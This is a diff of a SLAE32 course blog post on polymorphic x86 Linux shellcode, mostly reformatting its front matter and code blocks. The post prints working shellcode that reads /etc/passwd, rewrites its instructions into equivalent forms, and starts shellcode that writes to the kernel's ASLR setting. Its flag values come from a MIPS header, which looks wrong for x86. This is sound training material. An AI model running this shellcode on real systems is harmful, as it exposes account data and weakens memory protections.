@@ -1,44 +1,19 @@
 ---
-layout: post
+layout: single
 title: 'SLAE32 - Assignment #6 - Create Polymorphic Shellcode'
-date: 2019-06-26 22:56:51.000000000 +03:00
-type: post
-parent_id: '0'
-published: true
-password: ''
-status: publish
-categories:
-- Assembly
-- PentesterAcademy
-- SecurityTube
-- SLAE exam
-tags: []
-meta:
-  _rest_api_published: '1'
-  _rest_api_client_id: "-1"
-  _publicize_job_id: '36507537709'
-  timeline_notification: '1571476769'
-  jetpack_anchor_podcast: ''
-  _coblocks_attr: ''
-  _coblocks_dimensions: ''
-  _wpcom_is_markdown: '1'
-  _coblocks_accordion_ie_support: ''
-  amp_status: enabled
-  _coblocks_responsive_height: ''
-  _last_editor_used_jetpack: block-editor
-  spay_email: ''
-  jetpack_anchor_episode: ''
-  jetpack_anchor_spotify_show: ''
-  _wpas_is_tweetstorm: ''
-author:
-  login: xenovass
-  email: xenofonv@gmail.com
-  display_name: xenovas
-  first_name: Xenofon
-  last_name: Vassilakopoulos
-permalink: "/2019/06/26/slae-assignment-6-create-polymorphic-shellcode/"
----
-<p><!-- wp:html --></p>
+date: 2019-06-26
+classes: wide
+header:
+  teaser: /assets/images/SLAE32/SLAE32.jpg
+tags:
+  - SLAE32
+  - Pentester Academy
+  - Linux
+  - x86
+  - Shellcoding
+  - x86 Shellcode Analysis 
+--- 
+
 <h2><span style="color:#339966;"><strong>Student ID : SLAE &nbsp;- 1314</strong></span></h2>
 <p><!-- /wp:html --></p>
 <p><!-- wp:heading {"level":3} --></p>
@@ -80,20 +55,22 @@ permalink: "/2019/06/26/slae-assignment-6-create-polymorphic-shellcode/"
 <p class="">
 <!-- /wp:paragraph --></p>
 <p><!-- wp:preformatted --></p>
-<pre class="wp-block-preformatted">root@slae:/home/xenofon/Documents/Assignment6# echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u -<br />00000000  31C9              xor ecx,ecx<br />00000002  F7E1              mul ecx<br />00000004  B005              mov al,0x5<br />00000006  51                push ecx<br />00000007  6873737764        push dword 0x64777373<br />0000000C  68632F7061        push dword 0x61702f63<br />00000011  682F2F6574        push dword 0x74652f2f<br />00000016  89E3              mov ebx,esp<br />00000018  CD80              int 0x80<br />0000001A  93                xchg eax,ebx<br />0000001B  91                xchg eax,ecx<br />0000001C  B003              mov al,0x3<br />0000001E  31D2              xor edx,edx<br />00000020  66BAFF0F          mov dx,0xfff<br />00000024  42                inc edx<br />00000025  CD80              int 0x80<br />00000027  92                xchg eax,edx<br />00000028  31C0              xor eax,eax<br />0000002A  B004              mov al,0x4<br />0000002C  B301              mov bl,0x1<br />0000002E  CD80              int 0x80<br />00000030  93                xchg eax,ebx<br />00000031  CD80              int 0x80</pre>
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u -<br />00000000  31C9              xor ecx,ecx<br />00000002  F7E1              mul ecx<br />00000004  B005              mov al,0x5<br />00000006  51                push ecx<br />00000007  6873737764        push dword 0x64777373<br />0000000C  68632F7061        push dword 0x61702f63<br />00000011  682F2F6574        push dword 0x74652f2f<br />00000016  89E3              mov ebx,esp<br />00000018  CD80              int 0x80<br />0000001A  93                xchg eax,ebx<br />0000001B  91                xchg eax,ecx<br />0000001C  B003              mov al,0x3<br />0000001E  31D2              xor edx,edx<br />00000020  66BAFF0F          mov dx,0xfff<br />00000024  42                inc edx<br />00000025  CD80              int 0x80<br />00000027  92                xchg eax,edx<br />00000028  31C0              xor eax,eax<br />0000002A  B004              mov al,0x4<br />0000002C  B301              mov bl,0x1<br />0000002E  CD80              int 0x80<br />00000030  93                xchg eax,ebx<br />00000031  CD80              int 0x80
+</pre>
 <p><!-- /wp:preformatted --></p>
 <p><!-- wp:paragraph --></p>
 <p style="text-align:justify;">Furthermore, the above instructions need to be isolated to a new file with the correct format for example <strong>polytiny.nasm</strong> and then analyzing it using <strong>gdb.</strong></p>
 <p class="">
 <!-- /wp:paragraph --></p>
 <p><!-- wp:paragraph --></p>
-<pre>root@slae:/home/xenofon/Documents/Assignment6# echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u - | awk -F" " '{ print "\t" $3" "$4" "$5 }' | sed '1 i\\nglobal _start\n\nsection .text\n\n_start:'<br /><br />global _start<br /><br />section .text<br /><br />_start:<br />        xor ecx,ecx<br />        mul ecx<br />        mov al,0x5<br />        push ecx<br />        push dword 0x64777373<br />        push dword 0x61702f63<br />        push dword 0x74652f2f<br />        mov ebx,esp<br />        int 0x80<br />        xchg eax,ebx<br />        xchg eax,ecx<br />        mov al,0x3<br />        xor edx,edx<br />        mov dx,0xfff<br />        inc edx<br />        int 0x80<br />        xchg eax,edx<br />        xor eax,eax<br />        mov al,0x4<br />        mov bl,0x1<br />        int 0x80<br />        xchg eax,ebx<br />        int 0x80<br />root@slae:/home/xenofon/Documents/Assignment6#  echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u - | awk -F" " '{ print "\t" $3" "$4" "$5 }' | sed '1 i\\nglobal _start\n\nsection .text\n\n_start:' &gt; polytiny.nasm</pre>
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u - | awk -F" " '{ print "\t" $3" "$4" "$5 }' | sed '1 i\\nglobal _start\n\nsection .text\n\n_start:'<br /><br />global _start<br /><br />section .text<br /><br />_start:<br />        xor ecx,ecx<br />        mul ecx<br />        mov al,0x5<br />        push ecx<br />        push dword 0x64777373<br />        push dword 0x61702f63<br />        push dword 0x74652f2f<br />        mov ebx,esp<br />        int 0x80<br />        xchg eax,ebx<br />        xchg eax,ecx<br />        mov al,0x3<br />        xor edx,edx<br />        mov dx,0xfff<br />        inc edx<br />        int 0x80<br />        xchg eax,edx<br />        xor eax,eax<br />        mov al,0x4<br />        mov bl,0x1<br />        int 0x80<br />        xchg eax,ebx<br />        int 0x80<br />root@slae:/home/xenofon/Documents/Assignment6#  echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u - | awk -F" " '{ print "\t" $3" "$4" "$5 }' | sed '1 i\\nglobal _start\n\nsection .text\n\n_start:' &gt; polytiny.nasm</pre>
 <p>Before analysing the <em>shellcode,</em> it must be compiled using the following commands</p>
-<pre><br />nasm -f elf32 -F dwarf -g -o polytiny.o polytiny.nasm<br /><br />ld -z execstack -o polytiny polytiny.o<br /><br /></pre>
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># nasm -f elf32 -F dwarf -g -o polytiny.o polytiny.nasm <br><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># ld -z execstack -o polytiny polytiny.o<br /><br /></pre>
 <p>Then the debugging process of the executable file can be done using <strong>gdb</strong> as shown below</p>
-<pre>root@slae:/home/xenofon/Documents/Assignment6# gdb -q ./polytiny<br />Reading symbols from /home/xenofon/Documents/Assignment6/polytiny...done.<br />(gdb) set disassembly-flavor intel<br />(gdb) b _start<br />Breakpoint 1 at 0x8048080: file polytiny.nasm, line 7.<br />(gdb) r<br />Starting program: /home/xenofon/Documents/Assignment6/polytiny<br /><br />Breakpoint 1, _start () at polytiny.nasm:7</pre>
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># gdb -q ./polytiny<br />Reading symbols from /home/xenofon/Documents/Assignment6/polytiny...done.<br />(gdb) set disassembly-flavor intel<br />(gdb) b _start<br />Breakpoint 1 at 0x8048080: file polytiny.nasm, line 7.<br />(gdb) r<br />Starting program: /home/xenofon/Documents/Assignment6/polytiny<br /><br />Breakpoint 1, _start () at polytiny.nasm:7
+</pre>
 <p>In order to have an overview of the executed file, the <strong>disass</strong> gdb command can be used as follows</p>
-<pre>(gdb) disass<br />Dump of assembler code for function _start:<br /><span style="color:#ff0000;">=&gt; 0x08048080 &lt;+0&gt;: xor ecx,ecx</span><br />0x08048082 &lt;+2&gt;: mul ecx<br />0x08048084 &lt;+4&gt;: mov al,0x5<br />0x08048086 &lt;+6&gt;: push ecx<br />0x08048087 &lt;+7&gt;: push 0x64777373<br />0x0804808c &lt;+12&gt;: push 0x61702f63<br />0x08048091 &lt;+17&gt;: push 0x74652f2f<br />0x08048096 &lt;+22&gt;: mov ebx,esp<br />0x08048098 &lt;+24&gt;: int 0x80<br />0x0804809a &lt;+26&gt;: xchg ebx,eax<br />0x0804809b &lt;+27&gt;: xchg ecx,eax<br />0x0804809c &lt;+28&gt;: mov al,0x3<br />0x0804809e &lt;+30&gt;: xor edx,edx<br />0x080480a0 &lt;+32&gt;: mov dx,0xfff<br />0x080480a4 &lt;+36&gt;: inc edx<br />0x080480a5 &lt;+37&gt;: int 0x80<br />0x080480a7 &lt;+39&gt;: xchg edx,eax<br />0x080480a8 &lt;+40&gt;: xor eax,eax<br />0x080480aa &lt;+42&gt;: mov al,0x4<br />0x080480ac &lt;+44&gt;: mov bl,0x1<br />0x080480ae &lt;+46&gt;: int 0x80<br />0x080480b0 &lt;+48&gt;: xchg ebx,eax<br />0x080480b1 &lt;+49&gt;: int 0x80<br />End of assembler dump.</pre>
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">(gdb) disass<br />Dump of assembler code for function _start:<br /><span style="color:#ff0000;">=&gt; 0x08048080 &lt;+0&gt;: xor ecx,ecx</span><br />0x08048082 &lt;+2&gt;: mul ecx<br />0x08048084 &lt;+4&gt;: mov al,0x5<br />0x08048086 &lt;+6&gt;: push ecx<br />0x08048087 &lt;+7&gt;: push 0x64777373<br />0x0804808c &lt;+12&gt;: push 0x61702f63<br />0x08048091 &lt;+17&gt;: push 0x74652f2f<br />0x08048096 &lt;+22&gt;: mov ebx,esp<br />0x08048098 &lt;+24&gt;: int 0x80<br />0x0804809a &lt;+26&gt;: xchg ebx,eax<br />0x0804809b &lt;+27&gt;: xchg ecx,eax<br />0x0804809c &lt;+28&gt;: mov al,0x3<br />0x0804809e &lt;+30&gt;: xor edx,edx<br />0x080480a0 &lt;+32&gt;: mov dx,0xfff<br />0x080480a4 &lt;+36&gt;: inc edx<br />0x080480a5 &lt;+37&gt;: int 0x80<br />0x080480a7 &lt;+39&gt;: xchg edx,eax<br />0x080480a8 &lt;+40&gt;: xor eax,eax<br />0x080480aa &lt;+42&gt;: mov al,0x4<br />0x080480ac &lt;+44&gt;: mov bl,0x1<br />0x080480ae &lt;+46&gt;: int 0x80<br />0x080480b0 &lt;+48&gt;: xchg ebx,eax<br />0x080480b1 &lt;+49&gt;: int 0x80<br />End of assembler dump.</pre>
 <p style="text-align:justify;">Furthermore, the <strong>stepin (si)</strong> <strong>gdb</strong> command can be used in order to follow the executable instructions step by step and check how the program deals with registers and memory. As seen above in red, the first command <strong>xor ecx, ecx</strong> is zeroing out the <strong>ecx</strong> register. The next command, <strong>mul ecx</strong>  used to zero out the <strong>eax</strong> register because the <strong>mul</strong> instruction always performs multiplication with <strong>eax</strong> register.</p>
 <pre>Breakpoint 1, _start () at polytiny.nasm:7<br />7 xor ecx,ecx<br />(gdb) p/x $ecx<br />$2 = 0x0<br />(gdb) si<br />8 mul ecx<br />(gdb) p/x $eax<br />$1 = 0x0<br />(gdb)</pre>
 <p style="text-align:justify;">the above <strong>xor ecx, ecx</strong> instruction can be altered without affecting the functionality of the program. The <strong>xor ecx, ecx</strong> can be changed to the following instruction performing equivalent operation.</p>
@@ -124,7 +101,7 @@ permalink: "/2019/06/26/slae-assignment-6-create-polymorphic-shellcode/"
 <p style="text-align:justify;">Additionally, for the sake of polymorphism the following <strong>open</strong> system call will be used instead of the one discussed before which initially used from the original <em>shellcode</em>.  </p>
 <pre><b>int open(const char *</b><i>pathname</i><b>, int </b><i>flags, </i><b>mode_t </b><i>mode</i><b>);</b></pre>
 <p style="text-align:justify;">The function above has one extra argument named <strong>mode</strong> of type mode_t. The argument <strong>mode</strong> represents the permissions in case a new file is created using the <strong>open</strong> function call with the <strong>O_CREAT</strong> flag. If a new file is not being created then this argument is ignored. In this case the <em>shellcode</em> only reads from <strong>/etc/passwd</strong> file which is a system file already created from the Linux operating system. According to the <strong>open</strong> function prototype one extra instruction will be added that will assign the extra mode to the opened file.</p>
-<pre style="text-align:justify;"><span style="color:#99cc00;"><span style="color:#00ffff;">;Altered Shellcode Instruction</span><br /><span style="color:#00ff00;">mov dx, 0x1bc</span></span></pre>
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#99cc00;"><span style="color:#00ffff;">;Altered Shellcode Instruction</span><br /><span style="color:#00ff00;">mov dx, 0x1bc</span></span></pre>
 <p style="text-align:justify;">The above instruction is adding the permission mode <strong>0x1bc</strong> in hex which is <strong>444</strong> in decimal that defines the read, permissions to the opened file for the owner, the group and others. Nevertheless, because the file already exists the instruction above is useless thus providing a polymorphic change to the <em>shellcode</em>. </p>
 <p style="text-align:justify;">Then the <strong>int 0x80 </strong>instruction used to execute the system call referred by the <strong>0x5</strong> value that moved earlier inside the lower byte register <strong>al</strong>.</p>
 <pre>int 0x80<span style="color:#00ffff;"><br /></span></pre>
@@ -153,7 +130,7 @@ ssize_t read(int fd, void *buf, size_t count);</pre>
 <pre><span style="color:#00ffff;">; From original shellcode</span> <br />mov dx, 0xfff<br />inc edx<br /><br /><span style="color:#00ffff;">;Altered Shellcode Instructions</span><br /><span style="color:#00ffff;">;polymorphic version ( this two instructions perform the addition operation )</span><br /><span style="color:#ff0000;"><span style="color:#00ff00;">mov dx, 0xFFe </span><span style="color:#00ffff;">; this value represents 4094 in hex</span></span><br /><span style="color:#00ff00;">inc dx </span><span style="color:#00ffff;">; this instruction increases by one the value held in dx register </span></pre>
 <p style="text-align:justify;">The <strong>mov dx, 0xffe </strong>instruction moves the <strong>4094</strong> decimal value into <strong>dx</strong> register, and the <strong>inc dx</strong> instruction increases by one the hex value held by <strong>dx</strong> register. The result of the <strong>inc</strong> instruction produces the decimal value <strong>4096</strong> which constitutes the needed byte length of the buffer. In addition, the <strong>inc</strong> instruction has been chosen because it produces lower length shellcode comparing to other instructions such as for example the <strong>add</strong> instruction that performs the addition operation. </p>
 <p style="text-align:justify;">Moving further, in order to be sure that no null bytes produced when compiling the code, the compiled code can be checked using the following command </p>
-<pre style="text-align:justify;">objdump -d polytiny -M intel </pre>
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">objdump -d polytiny -M intel </pre>
 <pre>[...]<br />80480b4: 89 f1 mov ecx,esi<br />80480b6: b0 03 mov al,0x3<br />80480b8: 66 ba e7 0f mov dx,0xfe7<br />80480bc: 83 c2 19 add edx,0x19<br />80480bf: cd 80 int 0x80<br />[........]</pre>
 <p style="text-align:justify;">The produced bytecodes from running the above command are not containing any null bytes, so there is a green light to continue further to analyse and modify the rest of the instructions. Continuing further, the next instructions are representing the <strong>write </strong>system call used to print the output onto the console.</p>
 <pre><span style="color:#00ffff;">; Original Shellcode Instructions</span><br />xor eax, eax<br />mov al, 4<br />mov bl, 1<br />int 0x80</pre>
@@ -207,9 +184,15 @@ ssize_t read(int fd, void *buf, size_t count);</pre>
 <pre><span style="color:#00ff00;">xor ebx,ebx</span><br /><span style="color:#00ff00;">mul ebx</span></pre>
 <p style="text-align:justify;">The <strong>xor ebx, ebx</strong> used to zero out the <strong>ebx</strong> register. Then the<strong> mul ebx</strong> instruction used to zero out the <strong>eax</strong> register because the <strong>mul</strong> instruction is performing multiplication with the <strong>eax</strong> register. So, in the current case there is an additional extra instruction that is performing a zero out operation to <strong>ebx</strong> register without causing any alteration of the initially intended functionality. Additionally, one possible drawback of using the extra instruction is that it could probably increase the length of the final <em>shellcode</em>, but this  will be considered later. According with the analysis until now, the <strong>creat()</strong> system call will be used to open the <strong>/proc/sys/kernel/randomize_va_space</strong> file. Furthermore, the <em>shellcode</em> will push the arguments into the stack using the stack method.</p>
 <p style="text-align:justify;">Following, the <strong>creat()</strong> system call is shown and the full synopsis can be found at <a href="https://linux.die.net/man/3/creat">creat(3)</a> man page</p>
-<pre class="">int creat(const char *pathname, mode_t mode);</pre>
+
+```c 
+int creat(const char *pathname, mode_t mode);
+```
+
 <p style="text-align:justify;">The <strong>creat()</strong> system call returns an integer. There are also two arguments passed to the function, the first is the <strong>pathname</strong> of type<em> char*</em> and the second one is the <strong>mode</strong> of type <em>mode_t</em>. Additionally, according to <strong>creat()</strong> general description, the <strong>creat()</strong> system call is equivalent with the following call :</p>
-<pre style="text-align:justify;">open(path, O_WRONLY|O_CREAT|O_TRUNC, mode)</pre>
+```c 
+open(path, O_WRONLY|O_CREAT|O_TRUNC, mode)
+```
 <p style="text-align:justify;">Thus the file named by <span class="ph synph"><span class="ph var">pathname</span></span> is created, unless it already exists. Furthermore, the next instructions will push the following path <strong>/proc/sys/kernel/randomize_va_space</strong> into the stack in order to pass the first argument of the <strong>creat()</strong> system call.</p>
 <p>The next instruction will push the <strong>eax</strong> register into the stack</p>
 <pre>push eax </pre>
@@ -237,7 +220,9 @@ ssize_t read(int fd, void *buf, size_t count);</pre>
 <p style="text-align:justify;">According with the man page of <strong><a href="https://linux.die.net/man/3/creat">creat(3)</a></strong> system call the following <strong><a href="https://linux.die.net/man/3/open">open(3)</a></strong> system call</p>
 <pre>open(path, O_WRONLY|O_CREAT|O_TRUNC, mode)</pre>
 <p>is equivalent to the following <strong>creat()</strong> function call</p>
-<pre class="">creat(path, mode)</pre>
+```c
+creat(path, mode)
+```
 <p style="text-align:justify;">Following, in order to create polymorphism, the instructions implementing the <strong>open()</strong> system call will be changed using the additional instructions for the second and third argument of the <strong>open()</strong> system call. To proceed further, the hex values of <strong>O_CREAT | O_WRONLY | O_TRUNC</strong> flags must be known in order to use them as the second argument at <strong>open()</strong> system call. To this end, checking inside the /<em>usr/src/linux-headers-3.13.0-32/arch/mips/include/uapi/asm/fcntl.h</em> file the hex values of the flags above are seen below</p>
 <pre>#define O_CREAT  0x0100<br />#define O_TRUNC  0x0200</pre>
 <p style="text-align:justify;">The <strong>O_WRONLY</strong> flag defined at <em>/usr/src/linux-headers-3.13.0-32/include/uapi/asm-generic/fcntl.h </em>having the binary value <strong>00000001</strong><em>. </em>Also, the same flag can be found <em>at /usr/include/i386-linux-gnu/bits/fcntl-linux.h </em>with binary value <strong>01</strong><em><strong>. </strong></em>Both values are representing the same hexadecimal result <strong>0x1</strong><em><strong>. </strong></em>So, in order to perform the bitwise OR operation shown below some zeros will be added from right to left, changing the value format into the equivalent <strong>0x0001</strong>. The bitwise OR is applying a logical OR to the specified values. The flags are defined as a bitmask or individual bits, and by using the OR operation specific bits can be set in the target.</p>
